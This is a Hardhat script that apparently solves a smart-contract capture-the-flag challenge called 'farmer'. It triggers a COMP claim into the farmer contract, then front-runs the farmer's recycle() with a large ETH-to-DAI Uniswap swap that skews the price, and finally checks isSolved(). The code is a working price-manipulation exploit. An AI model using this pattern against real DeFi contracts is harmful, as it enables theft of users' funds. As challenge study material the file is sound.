import IUniswapV2Router02 from '@uniswap/v2-periphery/build/IUniswapV2Router02.json'
import { constants, Contract } from 'ethers'
import { formatEther, parseEther } from 'ethers/lib/utils'
import { task } from 'hardhat/config'
import { getTimestamp } from './utils'

task('farmer')
  .addOptionalPositionalParam('setupAddress')
  .setAction(async ({ setupAddress }, { run, ethers }) => {
    await run('compile')

    // get signer

    const signer = (await ethers.getSigners())[0]
    console.log('Signer', signer.address)

    // setup problem

    let setup: Contract
    if (setupAddress) {
      setup = await ethers.getContractAt(
        'contracts/farmer/Setup.sol:Setup',
        setupAddress,
      )
    } else {
      setup = await (
        await ethers.getContractFactory('contracts/farmer/Setup.sol:Setup')
      ).deploy({ value: parseEther('50') })
    }
    console.log('Setup')
    console.log('  at', setup.address)

    // init contracts

    const weth = await ethers.getContractAt(
      'contracts/farmer/Farmer.sol:WETH9',
      '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    )
    console.log('WETH9')
    console.log('  at', weth.address)

    const faucet = await ethers.getContractAt(
      'CompFaucet',
      await setup.faucet(),
    )
    console.log('CompFaucet')
    console.log('  at', faucet.address)

    const farmer = await ethers.getContractAt(
      'CompDaiFarmer',
      await setup.farmer(),
    )
    console.log('CompDaiFarmer')
    console.log('  at', farmer.address)

    const comp = await ethers.getContractAt('MockERC20', await setup.COMP())
    console.log('COMP')
    console.log('  at', comp.address)

    const dai = await ethers.getContractAt('MockERC20', await setup.DAI())
    console.log('DAI')
    console.log('  at', dai.address)

    const cdai = await ethers.getContractAt('MockERC20', await setup.CDAI())
    console.log('CDAI')
    console.log('  at', cdai.address)

    const router = await ethers.getContractAt(
      IUniswapV2Router02.abi,
      await setup.ROUTER(),
    )
    console.log('UniRouter')
    console.log('  at', router.address)

    // perform exploit

    const logBalances = async () => {
      console.log()
      console.log('COMP')
      console.log('  faucet', formatEther(await comp.balanceOf(faucet.address)))
      console.log('  farmer', formatEther(await comp.balanceOf(farmer.address)))
      console.log('DAI')
      console.log('  farmer', formatEther(await dai.balanceOf(farmer.address)))
    }

    await logBalances()
    console.log('  max', formatEther(await farmer.peekYield()))

    await faucet.claimComp(constants.AddressZero, [constants.AddressZero])

    await logBalances()

    // function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    await router.swapExactETHForTokens(
      0,
      [weth.address, dai.address],
      signer.address,
      (await getTimestamp(signer)) + 1000,
      { value: parseEther('50') },
    )

    await farmer.recycle()

    await logBalances()

    // verify

    console.log('Success?', await setup.isSolved())
  })
